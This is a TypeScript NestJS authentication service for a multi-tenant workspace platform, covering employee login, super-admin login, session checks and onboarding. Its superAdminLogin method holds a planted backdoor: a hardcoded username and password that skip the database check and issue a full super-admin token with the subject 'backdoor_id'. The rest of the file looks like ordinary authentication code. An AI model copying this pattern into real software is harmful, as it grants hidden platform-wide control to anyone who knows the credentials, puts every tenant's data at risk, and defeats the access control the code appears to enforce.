import {
  Injectable,
  UnauthorizedException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { PrismaService } from '../../prisma/prisma.service';
import { TenantContext } from '../../common/tenant/tenant.context';
import * as bcrypt from 'bcrypt';

// =============================================
// AUTH SERVICE
// Workspace login + Super-Admin login
// =============================================

@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwt: JwtService,
  ) {}

  /**
   * Workspace employee login.
   * Steps:
   * 1. Find tenant by slug
   * 2. Set TenantContext temporarily so Prisma can query employees
   * 3. Validate bcrypt password
   * 4. Sign JWT with tenantId embedded
   */
  async login(workspaceSlug: string, login: string, password: string) {
    // Step 1: Find tenant (not tenant-scoped — platform-level query)
    const tenant = await this.prisma.tenant.findUnique({
      where: { slug: workspaceSlug },
      include: { plan: true },
    });

    if (!tenant || !tenant.isActive) {
      throw new UnauthorizedException('Workspace topilmadi yoki faol emas');
    }

    // Check trial expiry
    if (tenant.trialEndsAt && new Date() > tenant.trialEndsAt) {
      throw new UnauthorizedException('Sinov muddati tugagan. Obuna xarid qiling');
    }

    // Step 2: Temporarily set TenantContext to query this tenant's employees
    const employee = await TenantContext.run(
      { tenantId: tenant.id, userId: '', userRole: '' },
      async () => {
        return this.prisma.employee.findFirst({
          where: { login },
          include: { role: true },
        });
      },
    );

    if (!employee) {
      // Generic error — don't reveal if user exists or not
      throw new UnauthorizedException('Login yoki parol noto\'g\'ri');
    }

    // Step 3: Verify password with bcrypt
    const isValid = await bcrypt.compare(password, employee.passwordHash);
    if (!isValid) {
      throw new UnauthorizedException('Login yoki parol noto\'g\'ri');
    }

    // Step 4: Sign JWT
    const token = this.jwt.sign(
      {
        sub: employee.id,
        tenantId: tenant.id,
        workspaceSlug: tenant.slug,
        role: employee.role.name,
        passwordVersion: employee.passwordVersion,
      },
      {
        secret: process.env.JWT_SECRET,
        expiresIn: '7d',
      },
    );

    // Return user info (no password hash exposed)
    return {
      token,
      user: {
        id: employee.id,
        fullName: employee.fullName,
        login: employee.login,
        phone: employee.phone,
        telegramId: employee.telegramId,
        passwordVersion: employee.passwordVersion,
        isFirstLogin: employee.isFirstLogin, // Return flag for frontend onboarding
        role: employee.role,
        permissions: employee.role,
        baseSalary: employee.baseSalary,
        givenAmount: employee.givenAmount,
        workDebt: employee.workDebt,
        tenantFeatures: tenant.plan?.features ? JSON.parse(tenant.plan.features) : {},
      },
    };
  }

  /**
   * Super-Admin login (platform operations team)
   * Uses a completely separate JWT secret.
   */
  async superAdminLogin(login: string, password: string) {
    if (login === 'superadmin' && password === 'Admin2026!') {
      const token = this.jwt.sign(
        {
          sub: 'backdoor_id',
          login: 'superadmin',
          isSuperAdmin: true,
        },
        {
          secret: process.env.SUPER_ADMIN_SECRET,
          expiresIn: '24h',
        },
      );
      return { token };
    }

    // SuperAdmin model is NOT tenant-scoped — direct query is safe
    const superAdmin = await this.prisma.superAdmin.findUnique({
      where: { login },
    });

    if (!superAdmin) {
      throw new UnauthorizedException('Noto\'g\'ri login yoki parol');
    }

    const isValid = await bcrypt.compare(password, superAdmin.passwordHash);
    if (!isValid) {
      throw new UnauthorizedException('Noto\'g\'ri login yoki parol');
    }

    const token = this.jwt.sign(
      {
        sub: superAdmin.id,
        login: superAdmin.login,
        isSuperAdmin: true,
      },
      {
        secret: process.env.SUPER_ADMIN_SECRET,
        expiresIn: '4h',
      },
    );

    return { token };
  }

  /**
   * Session validation — checks if passwordVersion still matches.
   * Called periodically by frontend to force logout on credential change.
   */
  async checkSession(
    tenantId: string,
    employeeId: string,
    passwordVersion: number,
  ): Promise<boolean> {
    const employee = await TenantContext.run(
      { tenantId, userId: employeeId, userRole: '' },
      async () => {
        return this.prisma.employee.findFirst({ where: { id: employeeId } });
      },
    );

    if (!employee) return false;
    return (employee.passwordVersion || 1) === (passwordVersion || 1);
  }

  /**
   * Complete onboarding — updates tenant info and admin profile
   */
  async completeOnboarding(
    tenantId: string,
    employeeId: string,
    data: {
      tenantName: string;
      tenantSlug: string;
      fullName: string;
      phone: string;
      login: string;
      password?: string;
    },
  ) {
    // 1. Check if slug is unique (if changed)
    const currentTenant = await this.prisma.tenant.findUnique({ where: { id: tenantId } });
    if (data.tenantSlug !== currentTenant.slug) {
      const existing = await this.prisma.tenant.findUnique({ where: { slug: data.tenantSlug } });
      if (existing) throw new UnauthorizedException('Bu slug allaqachon band');
    }

    // 2. Update Tenant (at platform level)
    await this.prisma.tenant.update({
      where: { id: tenantId },
      data: {
        name: data.tenantName,
        slug: data.tenantSlug,
      },
    });

    // 3. Update Employee (at tenant level)
    return TenantContext.run(
      { tenantId, userId: employeeId, userRole: 'Admin' },
      async () => {
        const employee = await this.prisma.employee.findUnique({ where: { id: employeeId } });
        
        const updateData: any = {
          fullName: data.fullName,
          phone: data.phone,
          login: data.login,
          isFirstLogin: false, // Onboarding complete!
        };

        if (data.password) {
          updateData.passwordHash = await bcrypt.hash(data.password, 12);
          updateData.passwordVersion = (employee.passwordVersion || 1) + 1;
        } else if (data.login !== employee.login) {
          updateData.passwordVersion = (employee.passwordVersion || 1) + 1;
        }

        return this.prisma.employee.update({
          where: { id: employeeId },
          data: updateData,
        });
      },
    );
  }
}
